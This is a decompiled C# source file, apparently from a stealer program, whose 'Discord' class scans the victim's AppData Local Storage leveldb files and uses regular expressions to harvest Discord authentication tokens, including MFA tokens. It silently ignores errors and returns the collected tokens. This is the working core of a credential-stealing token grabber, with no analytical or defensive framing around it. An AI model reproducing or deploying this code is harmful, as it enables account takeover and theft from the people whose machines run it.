using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace VisionDevelopment
{
	// Token: 0x02000007 RID: 7
	internal class Discord
	{
		// Token: 0x06000040 RID: 64 RVA: 0x00004724 File Offset: 0x00004724
		public static List<string> Get(string toPath)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\" + toPath + "\\Local Storage\\leveldb");
			List<string> list = new List<string>();
			try
			{
				foreach (FileInfo fileInfo in directoryInfo.GetFiles("*.ldb"))
				{
					string text = fileInfo.OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(text, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
					{
						Match match = (Match)obj;
						list.Add(match.Value);
					}
					foreach (object obj2 in Regex.Matches(text, "mfa\\.[\\w-]{84}"))
					{
						Match match2 = (Match)obj2;
						list.Add(match2.Value);
					}
				}
			}
			catch
			{
			}
			list = Enumerable.ToList<string>(Enumerable.Distinct<string>(list));
			return list;
		}
	}
}
